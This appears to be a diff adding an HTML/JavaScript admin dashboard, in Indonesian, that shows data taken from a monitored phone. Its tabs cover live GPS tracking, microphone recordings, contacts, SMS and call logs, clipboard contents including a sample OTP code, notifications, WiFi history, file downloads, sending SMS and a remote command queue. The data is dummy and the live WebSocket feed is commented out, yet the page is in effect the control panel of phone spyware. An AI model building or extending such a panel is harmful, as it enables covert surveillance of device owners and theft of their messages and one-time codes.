@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Dashboard Admin - User Detail (Realtime)</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 24px; background:#f6f8fa;}
+    .tabs { display: flex; gap: 8px; margin-bottom: 20px; flex-wrap: wrap;}
+    .tab { background: #eee; padding: 8px 14px; border-radius: 6px; cursor: pointer; }
+    .tab.active { background: #2376e2; color: #fff; }
+    .section { display: none; }
+    .section.active { display: block; }
+    table { width: 100%; border-collapse: collapse; margin-bottom: 18px; }
+    th, td { border: 1px solid #ddd; padding: 6px 10px; }
+    th { background: #f5f5f5; }
+    .label { font-weight: bold; color: #2376e2; }
+    #map { width: 100%; height: 220px; margin-bottom: 16px; }
+    .realtime { color: #00a01a; font-weight: bold; animation: blink 1.5s infinite; }
+    @keyframes blink { 50% { opacity: 0.2; } }
+    .tag { padding: 2px 8px; border-radius: 4px; background: #eee; font-size: 0.9em; }
+    .tag.green { background: #c9f7ce; color: #045d1c;}
+    .tag.red { background: #ffd6d6; color: #a80000;}
+    .tabs::-webkit-scrollbar {display:none;}
+  </style>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
+</head>
+<body>
+  <h2>Dashboard Admin - Monitoring User</h2>
+  <div class="tabs" id="tab-buttons">
+    <div class="tab active">GPS Logging</div>
+    <div class="tab">Microphone Recording</div>
+    <div class="tab">Contacts</div>
+    <div class="tab">SMS Logs</div>
+    <div class="tab">Send SMS</div>
+    <div class="tab">Call Logs</div>
+    <div class="tab">Installed Apps</div>
+    <div class="tab">Stub Permissions</div>
+    <div class="tab">Clipboard</div>
+    <div class="tab">Notifications</div>
+    <div class="tab">WiFi Networks</div>
+    <div class="tab">File Explorer</div>
+    <div class="tab">Command Queue</div>
+  </div>
+
+  <!-- GPS Logging Section -->
+  <div class="section active">
+    <h4>GPS Logging <span class="realtime">● Realtime</span></h4>
+    <div id="map"></div>
+    <table>
+      <tr><th>Waktu</th><th>Latitude</th><th>Longitude</th><th>Alamat</th></tr>
+      <tbody id="gps-log-table"></tbody>
+    </table>
+  </div>
+  <!-- Microphone Recording -->
+  <div class="section">
+    <h4>Microphone Recording</h4>
+    <table>
+      <tr><th>Waktu</th><th>File</th></tr>
+      <tbody id="mic-log-table"></tbody>
+    </table>
+  </div>
+  <!-- Contacts Section -->
+  <div class="section">
+    <h4>Kontak</h4>
+    <table>
+      <tr>
+        <th class="label">Nama Kontak</th>
+        <th class="label">Nomor Telepon</th>
+      </tr>
+      <tbody id="contacts-table"></tbody>
+    </table>
+  </div>
+  <!-- SMS Logs Section -->
+  <div class="section">
+    <h4>SMS Logs</h4>
+    <table>
+      <tr>
+        <th class="label">Tipe SMS</th>
+        <th class="label">Nomor Pengirim/Penerima</th>
+        <th class="label">Isi Pesan</th>
+        <th class="label">Waktu</th>
+      </tr>
+      <tbody id="sms-table"></tbody>
+    </table>
+  </div>
+  <!-- Send SMS -->
+  <div class="section">
+    <h4>Kirim SMS</h4>
+    <form id="send-sms-form">
+      <input type="text" id="smsTo" placeholder="Nomor Tujuan" style="width:180px;">&nbsp;
+      <input type="text" id="smsBody" placeholder="Isi pesan..." style="width:260px;">
+      <button type="submit">Kirim SMS</button>
+      <span id="smsSendStatus"></span>
+    </form>
+  </div>
+  <!-- Call Logs Section -->
+  <div class="section">
+    <h4>Call Logs</h4>
+    <table>
+      <tr>
+        <th class="label">Tipe Panggilan</th>
+        <th class="label">Nomor</th>
+        <th class="label">Durasi (detik)</th>
+        <th class="label">Waktu</th>
+      </tr>
+      <tbody id="call-table"></tbody>
+    </table>
+  </div>
+  <!-- Installed Apps -->
+  <div class="section">
+    <h4>Installed Apps</h4>
+    <table>
+      <tr><th>App</th><th>Package</th><th>Versi</th></tr>
+      <tbody id="apps-table"></tbody>
+    </table>
+  </div>
+  <!-- Stub Permissions -->
+  <div class="section">
+    <h4>Stub Permissions</h4>
+    <table>
+      <tr><th>Permission</th><th>Status</th><th>Update</th></tr>
+      <tbody id="perm-table"></tbody>
+    </table>
+  </div>
+  <!-- Clipboard Logging -->
+  <div class="section">
+    <h4>Clipboard</h4>
+    <ul id="clipboard-list"></ul>
+  </div>
+  <!-- Notifications -->
+  <div class="section">
+    <h4>Notifications</h4>
+    <ul id="notif-list"></ul>
+  </div>
+  <!-- WiFi Networks -->
+  <div class="section">
+    <h4>WiFi Networks</h4>
+    <table>
+      <tr><th>SSID</th><th>Waktu</th><th>Lokasi</th></tr>
+      <tbody id="wifi-table"></tbody>
+    </table>
+  </div>
+  <!-- File Explorer -->
+  <div class="section">
+    <h4>File Explorer</h4>
+    <table>
+      <tr><th>Path</th><th>Ukuran</th><th>Action</th></tr>
+      <tbody id="file-table"></tbody>
+    </table>
+  </div>
+  <!-- Command Queue -->
+  <div class="section">
+    <h4>Command Queue</h4>
+    <table>
+      <tr><th>Perintah</th><th>Status</th><th>Waktu</th></tr>
+      <tbody id="cmd-table"></tbody>
+    </table>
+  </div>
+
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+  <script>
+    // Tabs
+    const tabs = document.querySelectorAll('.tab');
+    const sections = document.querySelectorAll('.section');
+    tabs.forEach((tab, i) => {
+      tab.onclick = () => {
+        tabs.forEach(t => t.classList.remove('active'));
+        sections.forEach(s => s.classList.remove('active'));
+        tab.classList.add('active');
+        sections[i].classList.add('active');
+      };
+    });
+
+    // --- Dummy Data (replace with WebSocket data on live) ---
+    let gpsData = [
+      { time: "2025-08-03 15:30:40", lat: -6.210, lon: 106.820, address: "Jl. Sudirman, Jakarta" },
+      { time: "2025-08-03 15:28:20", lat: -6.200, lon: 106.816, address: "Jl. MH Thamrin, Jakarta" },
+    ];
+    let micData = [
+      { time: "2025-08-03 15:29:01", file: "audio1.mp3" },
+      { time: "2025-08-03 15:15:10", file: "audio2.mp3" },
+    ];
+    let contactsData = [
+      { name: "Andi", phone: "081234567890" }, { name: "Siti", phone: "082198765432" }
+    ];
+    let smsData = [
+      { direction: "IN", from: "081211122233", to: "", body: "Halo", time: "2025-08-03 15:15:00" },
+      { direction: "OUT", from: "", to: "081244455566", body: "Siap", time: "2025-08-03 15:18:30" },
+    ];
+    let callData = [
+      { type: "INCOMING", number: "081299988877", duration: 60, time: "2025-08-03 14:55:10" },
+      { type: "OUTGOING", number: "081255566677", duration: 120, time: "2025-08-03 14:50:00" },
+    ];
+    let appsData = [
+      { app: "WhatsApp", package: "com.whatsapp", version: "2.24.11" },
+      { app: "Instagram", package: "com.instagram.android", version: "300.1.0" }
+    ];
+    let permData = [
+      { permission: "GPS", status: true, updated: "2025-08-03 14:00" },
+      { permission: "Microphone", status: false, updated: "2025-08-03 14:00" },
+      { permission: "Contacts", status: true, updated: "2025-08-03 14:00" }
+    ];
+    let clipboardData = [
+      { time: "2025-08-03 11:00", content: "Kode OTP: 123456" }
+    ];
+    let notifData = [
+      { time: "2025-08-03 15:30", title: "WhatsApp", body: "Pesan baru masuk" }
+    ];
+    let wifiData = [
+      { ssid: "RumahAja", time: "2025-08-03 08:00", location: "Jakarta" },
+      { ssid: "Kantor1", time: "2025-08-02 17:00", location: "Jakarta" },
+    ];
+    let fileData = [
+      { path: "/storage/Download/file1.pdf", size: "2MB" },
+      { path: "/storage/DCIM/photo.jpg", size: "1.2MB" },
+    ];
+    let cmdData = [
+      { command: "Reboot Device", status: "Selesai", time: "2025-08-03 09:00" },
+      { command: "Request Screenshot", status: "Pending", time: "2025-08-03 12:05" },
+    ];
+
+    // --- Render Functions ---
+    function renderGpsLog() {
+      document.getElementById('gps-log-table').innerHTML = gpsData.map(
+        d => `<tr><td>${d.time}</td><td>${d.lat}</td><td>${d.lon}</td><td>${d.address}</td></tr>`
+      ).join('');
+    }
+    function renderMicLog() {
+      document.getElementById('mic-log-table').innerHTML = micData.map(
+        d => `<tr><td>${d.time}</td><td><a href="#">${d.file}</a></td></tr>`
+      ).join('');
+    }
+    function renderContacts() {
+      document.getElementById('contacts-table').innerHTML = contactsData.map(
+        d => `<tr><td>${d.name}</td><td>${d.phone}</td></tr>`
+      ).join('');
+    }
+    function renderSms() {
+      document.getElementById('sms-table').innerHTML = smsData.map(
+        d => `<tr><td>${d.direction==='IN'?'Masuk':'Keluar'}</td><td>${d.direction==='IN'?d.from:d.to}</td><td>${d.body}</td><td>${d.time}</td></tr>`
+      ).join('');
+    }
+    function renderCalls() {
+      document.getElementById('call-table').innerHTML = callData.map(
+        d => `<tr><td>${d.type==='INCOMING'?'Masuk':d.type==='OUTGOING'?'Keluar':'Tidak Terjawab'}</td><td>${d.number}</td><td>${d.duration}</td><td>${d.time}</td></tr>`
+      ).join('');
+    }
+    function renderApps() {
+      document.getElementById('apps-table').innerHTML = appsData.map(
+        d => `<tr><td>${d.app}</td><td>${d.package}</td><td>${d.version}</td></tr>`
+      ).join('');
+    }
+    function renderPerms() {
+      document.getElementById('perm-table').innerHTML = permData.map(
+        d => `<tr><td>${d.permission}</td><td><span class="tag ${d.status?'green':'red'}">${d.status?'Granted':'Denied'}</span></td><td>${d.updated}</td></tr>`
+      ).join('');
+    }
+    function renderClipboard() {
+      document.getElementById('clipboard-list').innerHTML = clipboardData.map(
+        d => `<li>${d.time}: ${d.content}</li>`
+      ).join('');
+    }
+    function renderNotif() {
+      document.getElementById('notif-list').innerHTML = notifData.map(
+        d => `<li>${d.time}: <b>${d.title}</b> - ${d.body}</li>`
+      ).join('');
+    }
+    function renderWifi() {
+      document.getElementById('wifi-table').innerHTML = wifiData.map(
+        d => `<tr><td>${d.ssid}</td><td>${d.time}</td><td>${d.location}</td></tr>`
+      ).join('');
+    }
+    function renderFile() {
+      document.getElementById('file-table').innerHTML = fileData.map(
+        d => `<tr><td>${d.path}</td><td>${d.size}</td><td><button>Download</button></td></tr>`
+      ).join('');
+    }
+    function renderCmd() {
+      document.getElementById('cmd-table').innerHTML = cmdData.map(
+        d => `<tr><td>${d.command}</td><td>${d.status}</td><td>${d.time}</td></tr>`
+      ).join('');
+    }
+
+    // --- Init Render
+    renderGpsLog(); renderMicLog(); renderContacts(); renderSms(); renderCalls(); renderApps();
+    renderPerms(); renderClipboard(); renderNotif(); renderWifi(); renderFile(); renderCmd();
+
+    // --- Map setup ---
+    var map = L.map('map').setView([gpsData[0].lat, gpsData[0].lon], 15);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(map);
+    var marker = L.marker([gpsData[0].lat, gpsData[0].lon]).addTo(map).bindPopup("Lokasi Terkini");
+
+    // --- Realtime simulation & WebSocket Demo ---
+    // Ganti ke WebSocket backend untuk live data! 
+    // (ws = new WebSocket('ws://localhost:8000/ws/userid'); ws.onmessage = ...)
+    setInterval(function() {
+      // GPS
+      const now = new Date();
+      const lat = gpsData[0].lat + (Math.random()-0.5)*0.001;
+      const lon = gpsData[0].lon + (Math.random()-0.5)*0.001;
+      gpsData.unshift({
+        time: now.toISOString().replace('T',' ').substring(0,19),
+        lat: +lat.toFixed(6),
+        lon: +lon.toFixed(6),
+        address: "Pindah, Jakarta"
+      });
+      if (gpsData.length > 10) gpsData.pop();
+      renderGpsLog();
+      marker.setLatLng([lat, lon]);
+      map.panTo([lat, lon]);
+      // Clipboard & Notif dummy
+      clipboardData.unshift({ time: now.toISOString().substr(0, 19), content: "Clipboard baru " + Math.floor(Math.random()*100) });
+      if (clipboardData.length > 5) clipboardData.pop();
+      renderClipboard();
+      notifData.unshift({ time: now.toISOString().substr(0, 16), title: "Notif", body: "Notifikasi baru " + Math.floor(Math.random()*100) });
+      if (notifData.length > 5) notifData.pop();
+      renderNotif();
+    }, 5000);
+
+    // --- Send SMS form (demo only, not functional) ---
+    document.getElementById('send-sms-form').onsubmit = function(e) {
+      e.preventDefault();
+      document.getElementById('smsSendStatus').textContent = " (SMS terkirim [simulasi])";
+      document.getElementById('smsTo').value = "";
+      document.getElementById('smsBody').value = "";
+      setTimeout(()=>{document.getElementById('smsSendStatus').textContent="";}, 2000);
+    };
+
+    // --- Contoh WebSocket Live Update (ganti dummy di atas) ---
+    // let ws = new WebSocket('ws://localhost:8000/ws/user1');
+    // ws.onmessage = function(event) {
+    //   let data = JSON.parse(event.data);
+    //   if(data.type==="gps") { gpsData.unshift(data); renderGpsLog(); marker.setLatLng([data.lat, data.lon]); map.panTo([data.lat, data.lon]); }
+    //   else if(data.type==="contacts") { contactsData = data.contacts; renderContacts();}
+    //   else if(data.type==="sms") { smsData.unshift(data.sms); renderSms();}
+    //   ... dst
+    // };
+  </script>
+</body>
+</html>
